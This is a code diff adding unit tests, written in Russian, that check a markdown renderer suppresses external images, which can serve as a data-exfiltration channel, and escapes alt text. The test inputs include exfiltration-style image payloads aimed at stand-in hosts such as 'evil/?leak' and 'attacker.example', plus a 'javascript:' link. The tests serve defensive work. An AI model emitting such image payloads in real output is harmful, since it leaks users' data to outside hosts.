@@ -52,6 +52,41 @@ describe('renderPlainMarkdown', () => {
     const linkHtml = renderPlainMarkdown('[x](javascript:alert(1))')
     expect(linkHtml).not.toContain('href="javascript:')
   })
+
+  // Глушение внешних markdown-картинок: канал эксфильтрации `![](https://…/?leak)`
+  // не должен эмитить внешний <img>. Оставляем только alt-текст.
+  test('внешняя markdown-картинка НЕ создаёт <img>, остаётся alt-текст', () => {
+    const html = renderPlainMarkdown('![secret alt](http://evil/?leak)')
+    expect(html).not.toContain('<img')
+    expect(html).not.toContain('evil')
+    expect(html).toContain('secret alt')
+  })
+
+  test('внешняя https-картинка тоже глушится', () => {
+    const html = renderPlainMarkdown('![a](https://attacker.example/pixel.png)')
+    expect(html).not.toContain('<img')
+    expect(html).not.toContain('attacker.example')
+  })
+
+  test('protocol-relative //host картинка глушится (не начинается с одного "/")', () => {
+    const html = renderPlainMarkdown('![a](//evil/x.png)')
+    expect(html).not.toContain('<img')
+    expect(html).not.toContain('evil')
+  })
+
+  test('относительная/абсолютная (/-префикс) картинка всё ещё рендерится', () => {
+    const html = renderPlainMarkdown('![chart](/api/stages/s1/artifacts/chart.png)')
+    expect(html).toContain('<img')
+    expect(html).toContain('src="/api/stages/s1/artifacts/chart.png"')
+    expect(html).toContain('alt="chart"')
+  })
+
+  test('alt-текст внешней картинки экранируется (без инъекции)', () => {
+    const html = renderPlainMarkdown('![<b>&x](http://evil/)')
+    expect(html).not.toContain('<img')
+    expect(html).not.toContain('<b>')
+    expect(html).toContain('&lt;b&gt;')
+  })
 })
 
 describe('renderMarkdown', () => {
